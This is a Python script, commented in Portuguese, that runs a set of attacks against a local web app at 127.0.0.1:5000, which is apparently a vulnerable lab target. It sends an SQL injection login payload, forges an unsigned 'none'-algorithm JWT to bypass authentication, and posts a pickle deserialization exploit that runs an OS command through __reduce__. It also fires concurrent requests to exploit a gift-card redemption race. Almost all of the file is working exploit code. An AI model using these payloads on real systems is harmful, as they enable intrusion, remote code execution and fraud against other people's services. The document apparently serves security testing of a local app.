import requests
import base64
import pickle
import threading
import time
import os

BASE_URL = "http://127.0.0.1:5000"

def test_sql_injection():
    payload = '" OR "1"="1'
    res = requests.post(
        f"{BASE_URL}/login",
        json={"username": "admin", "password": payload}
    )
    print("[SQLi] status:", res.status_code, "body:", res.text)

def test_jwt_bypass():
    # Gera token sem assinatura (algoritmo "none")
    token = base64.urlsafe_b64encode(b'{"sub":1,"iat":0,"exp":9999999999}').decode().strip("=")
    forged = f"{token}.{token}."
    res = requests.get(
        f"{BASE_URL}/notes/1",
        headers={"Authorization": f"Bearer {forged}"}
    )
    print("[JWT bypass] status:", res.status_code, "body:", res.text)

def test_pickle_rce():
    class Exploit:
        def __reduce__(self):
            return (__import__("os").system, ("echo RCE_OK > rce.txt",))
    payload_obj = Exploit()
    raw = pickle.dumps(payload_obj)
    b64 = base64.b64encode(raw).decode()
    res = requests.post(
        f"{BASE_URL}/profile/import",
        data=b64  # sem json, pois o endpoint lê raw base64
    )
    print("[Pickle RCE] status:", res.status_code, "body:", res.text)
    # depois verifique se rce.txt foi criado:
    print("→ Conteúdo de rce.txt:", open("rce.txt").read().strip() if os.path.exists("rce.txt") else "não criado")

def test_race_condition():
    # dispara várias threads contra /giftcard/redeem se você tiver esse endpoint ativo
    def worker(i):
        res = requests.post(f"{BASE_URL}/giftcard/redeem", json={"code":"VALE50"})
        print(f"[Race {i}] {res.status_code} {res.text}")
    threads = [threading.Thread(target=worker, args=(i,)) for i in range(10)]
    for t in threads: t.start()
    for t in threads: t.join()

if __name__ == "__main__":
    test_sql_injection()
    time.sleep(1)
    test_jwt_bypass()
    time.sleep(1)
    test_pickle_rce()
    # se tiver giftcard/redeem habilitado:
    # time.sleep(1)
    # test_race_condition()
